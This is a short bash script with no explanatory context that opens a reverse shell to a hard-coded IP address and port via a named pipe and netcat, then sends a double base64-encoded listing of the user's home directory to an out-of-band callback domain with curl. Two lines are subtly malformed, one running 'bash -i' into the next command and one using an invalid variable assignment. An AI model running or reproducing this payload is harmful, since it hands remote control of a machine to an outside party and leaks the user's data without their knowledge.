#!/bin/bash

bash -i  rm /tmp/f>/dev/null 2>&1;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 18.198.77.177 17446 >/tmp/f 

$B64_BLOB=`ls $HOME | base64 | base64`

curl -s -d "$B64_BLOB" "https://dqlfdzgroddmzbuqfjndfaghnnk8bq84t.oast.fun/" > /dev/null

echo "Done"